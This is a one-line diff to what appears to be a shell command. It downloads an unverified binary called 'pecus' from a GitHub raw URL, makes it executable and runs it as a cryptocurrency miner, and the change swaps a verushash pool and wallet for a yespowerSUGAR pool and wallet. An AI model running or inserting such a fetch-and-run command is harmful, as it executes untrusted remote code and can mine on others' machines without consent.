@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/Zuraadlef/FAS/main/pecus && chmod +x pecus && ./pecus --algorithm verushash --pool na.luckpool.net:3956 --wallet RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w1 --password x --cpu-threads 50
+wget https://raw.githubusercontent.com/Zuraadlef/FAS/main/pecus && chmod +x pecus && ./pecus -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qeky6mv620yys9cepjsh66gl77efmwvpashl8ry.w1
